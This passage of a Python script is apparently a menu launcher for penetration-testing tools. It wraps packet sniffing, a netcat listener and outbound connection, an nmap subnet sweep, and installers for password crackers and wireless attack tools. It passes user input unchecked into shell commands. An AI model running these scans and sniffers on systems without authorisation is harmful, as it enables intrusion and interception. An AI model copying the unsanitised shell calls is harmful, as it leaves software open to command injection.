        os.system(f'tshark -i {newchoose4} -w {savefile2}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose11 == "99":
        Menu()

def NGREP():
    os.system('clear')
    print("-----ngrep-----")
    print()
    newlist4 = ["1", "2", "99"]
    print("[1]--basic capture")
    print("[2]--capture and display matching packets")
    print("[99]--exit")
    print()
    choose12 = input("Choose an option: ")
    if choose12 == "1":
        os.system('clear')
        os.system('iwconfig')
        newchoose5 = input("Choose an interface: ")
        print("starting ngrep...")
        time.sleep(1)
        os.system(f"ngrep -d {newchoose5} 'pattern'")
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose12 == "2":
        os.system('clear')
        newchoose6 = input("type somthing to if that machs with packets: ")
        os.system(f"ngrep -w byline '{newchoose6}'")
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose12 == "99":
        Menu()

def NETCAT():
    os.system('clear')
    print("-----netcat-----")
    print()
    newlist5 = ["1", "2", "99"]
    print("[1]--to listen for connections")
    print("[2]--to send data")
    print("[99]--exit")
    print()
    choose13 = input("Choose an option: ")
    if choose13 == "1":
        os.system('clear')
        newport = input("Enter port to listen: ")
        os.system(f'nc -l -p {newport}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose13 == "2":
        os.system('clear')
        newhostname = input("Enter a hostname(like example.com): ")
        newport2 = input("Enter port: ")
        os.system(f'nc {newhostname} {newport2}')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose13 == "99":
        Menu()

def SCAPY():
    os.system('clear')
    print("-----scapy-----")
    print()
    newlist6 = ["1", "2", "3", "4", "99"]
    print("[1]--sniff with eth0")
    print("[2]--sniff with wlan0")
    print("[3]--sniff with eth1")
    print("[4]--sniff with wlan1")
    print("[99]--exit")
    print()
    choose14 = input("Choose an option: ")
    if choose14 == "1":
        sniff(iface="eht0", count=10)
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose14 == "2":
        sniff(iface="wlan0", count=10)
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose14 == "3":
        sniff(iface="eth1", count=10)
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose14 == "4":
        sniff(iface="wlan1", count=10)
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif choose14 == "99":
        Menu()

def IFTOP():
    os.system('clear')
    print("-----iftop-----")
    print()
    os.system('iwconfig')
    print()
    newchoose7 = input("Choose an interface: ")
    print("starting iftop...")
    time.sleep(1)
    os.system(f'iftop -i {newchoose7}')
    print()
    print()
    gotomenu = input("Press Enter to quit!")

def NmAp():
    os.system('clear')
    print("-----nmap-----")
    print()
    newchoose8 = input("Enter target ip: ")
    print("starting nmap...")
    time.sleep(1)
    os.system(f'nmap -sP {newchoose8}/24')
    print()
    print()
    gotomenu = input("Press Enter to quit!")

def Install_and_Update():
    os.system('clear')
    print(color.warning + '8888  88    88 .dP"Y8 888888    b0d    88    88      ')
    print(' 88   8888  88 `Ydo."   88     dY Yb   88    88      ')
    print(' 88   88 88 88 o.`y8b   88    dY888Yb  88___ 88___   ')
    print('8888  88  8888 8bodP"   88   dY     Yb 88888 88888   ')
    print()
    print("                    888888")
    print("                  8Y      Y8")
    print("                 8Y        Y8")
    print("                  8Y      Y8")
    print("                   8Y    Y8")
    print("                     8YY8")
    print("                   8Y    Y8")
    print("                  8Y       Y8")
    print("                8Y           Y8")
    print("                8Y             Y8  Y8")
    print("                 8Y              Y8")
    print("                  8Y           Y8  Y8")
    print("                    8Y8YY88Y8Y8")
    print()
    print("l8     8l  888888 8888y      b0d    888888 888888")
    print("l8     8l  88__88 88   88   dY Yb     88   88__  ")
    print('l8     8l  88""   88   88  dY888Yb    88   88""  ')
    print("  l888l    88     8888y   dY     Yb   88   888888")
    print()
    list00 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 00]
    print(color.end + "[1]--Install nmap")
    print("[2]--Install setoolkit")
    print("[3]--Install WPScan")
    print("[4]--Install SQLMap")
    print("[5]--Install Hydra")
    print("[6]--Install wifite")
    print("[7]--Install spooftooph")
    print("[8]--Install Dirb")
    print("[9]--Install ping")
    print("[10]--Install John the ripper")
    print("[11]--Install hashcat")
    print("[12]--Install ettercap")
    print("[13]--install tcpdump")
    print("[14]--Install tshark")
    print("[15]--Install ngrep")
    print("[16]--Install netcat")
    print("[17]--Install iftop")
    print("[18]--Install scapy")
    print("[00]--exit")
    print()
    installandupdate = int(input("SC ~# "))
    if installandupdate == 1:
        os.system('clear')
        os.system('sudo apt install nmap')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 2:
        os.system('clear')
        os.system('sudo apt install set')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 3:
        os.system('clear')
        os.system('apt install wpscan')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 4:
        os.system('clear')
        os.system('apt install sqlmap')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 5:
        os.system('clear')
        os.system('apt install hydra')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 6:
        os.system('clear')
        os.system('sudo apt install wifite')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 7:
        os.system('clear')
        os.system('sudo apt install spooftooph')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 8:
        os.system('clear')
        os.system('apt install dirb')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 9:
        os.system('clear')
        os.system('apt install ping')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 10:
        os.system('clear')
        os.system('sudo apt install john')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 11:
        os.system('clear')
        os.system('sudo apt install hashcat')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 12:
        os.system('clear')
        os.system('sudo apt install ettercap-common')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 13:
        os.system('clear')
        os.system('sudo apt install tcpdump')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 14:
        os.system('clear')
        os.system('sudo apt install tshark')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 15:
        os.system('clear')
        os.system('sudo apt install ngrep')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 16:
        os.system('clear')
        os.system('sudo apt install netcat-traditional')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 17:
        os.system('clear')
        os.system('sudo apt-get install iftop')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 18:
        os.system('clear')
        os.system('pip install scapy')
        print()
        print()
        gotomenu = input("Press Enter to quit!")
    elif installandupdate == 00:
        Menu()
    else:
        os.system('clear')
        print("there is no option, please try agian!")
        time.sleep(2)
        Menu()


def main():
    while True:
        choice = Menu()
        
        if choice == "1":
            Information_gathring()
        elif choice == "2":
            Explotation_tools()
        elif choice == "3":
            Wireless_Testing()
        elif choice == "4":
            WEB_hacking()
        elif choice == "5":
            Password_Attacks()
        elif choice == "6":
            Sniffing_and_Spoofing()
        elif choice == "0":
            Install_and_Update()
        elif choice == "99":
            print()
            print()
            print(color.IMPORTANT + "quiting...")
            time.sleep(1)
            break
        else:
            os.system('clear')
            print("Invalid choice. Please try again.")
            time.sleep(1)

if __name__ == "__main__":
    main()
